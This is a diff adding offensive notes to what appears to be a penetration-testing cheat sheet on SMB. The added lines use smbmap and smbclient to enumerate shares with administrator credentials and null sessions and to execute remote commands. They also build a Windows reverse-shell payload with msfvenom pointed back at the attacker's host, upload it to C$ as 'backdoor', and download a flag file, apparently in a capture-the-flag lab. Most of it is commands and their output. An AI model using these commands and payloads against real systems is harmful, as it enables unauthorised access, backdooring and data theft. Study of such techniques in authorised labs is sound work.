@@ -24,6 +24,12 @@ Host script results:
 |     3.00
 |_    3.02
 
+# List drives on target 
+$ smbmap -u administrator -p password123 -H $target -L 
+
+# Very similar and useful as well is SMBCLIENT
+# Null Session list, if allowed
+$ smbclient -L \\\\$target\\
 
 # But what if you have some credentials???
 
@@ -85,5 +91,38 @@ $ smbmap -u administrator -p password123 -d . -H $target
 	D$                                                	READ, WRITE	Default share
 
 
+# Execute commands (danger, Will Robinson)
+$ smbmap -u administrator -p password123 -H $target -x 'ipconfig'
+
+# you get what we can do here
+
+# list contentes in drive
+$ smbmap -u administrator -p password123 -H $target -r 'C$'
+
+# upload a *AHEM* 'sample' file
+$ msfvenom -a x86 --platform Windows -p /windows/shell_reverse_tcp LHOST=$me LPORT=$myport EXITFUNC=thread -b '\x00\x0a\x0d' -f exe -o sample.exe
+
+$ smbmap -u administrator -p password123 -H $target --upload '/root/shells/sample.exe' 'C$\backdoor'
+[+] Starting upload: /root/shells/sample.exe (0 bytes)
+[+] Upload complete
+
+# trust, but verify
+
+$ smbmap -u administrator -p smbserver_771 -H $target -r 'C$'                  
+[+] IP: 10.4.18.185:445	Name: 10.4.18.185                                       
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	C$                                                	READ, WRITE	
+	.\C$\*
+	dr--r--r--                0 Sat Sep  5 13:26:00 2020	$Recycle.Bin
+	fr--r--r--                0 Tue Dec 21 20:13:07 2021	backdoor
+	fw--w--w--           398356 Wed Aug 12 10:47:41 2020	bootmgr
+	fr--r--r--                1 Wed Aug 12 10:47:40 2020	BOOTNXT
+	fr--r--r--               32 Mon Dec 21 21:27:10 2020	flag.txt
+	
+
+$ smbmap -u administrator -p smbserver_771 -H $target --download 'C$\flag.txt'
+[+] Starting download: C$\flag.txt (32 bytes)
+[+] File output to: /root/10.4.18.185-C_flag.txt
 
 
